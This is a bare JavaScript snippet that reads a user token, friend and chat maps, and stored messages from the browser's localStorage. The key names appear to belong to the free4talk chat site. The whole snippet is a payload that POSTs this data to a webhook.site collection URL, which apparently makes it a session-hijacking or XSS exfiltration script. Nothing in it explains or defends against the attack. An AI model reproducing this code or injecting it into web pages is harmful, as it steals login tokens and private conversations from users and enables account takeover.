fetch('https://webhook.site/c01c6032-d6a0-45bb-b573-2d997c0a3178',
  {
    mode: 'no-cors',
    method: 'POST',
    body: JSON.stringify({
      token: localStorage['user:token'],
      userMap: localStorage['friends:userMap'],
      lastChatMap: localStorage['friends:lastChatMap'],
      messages: localStorage['free4talk:messages'],
    }),
  });
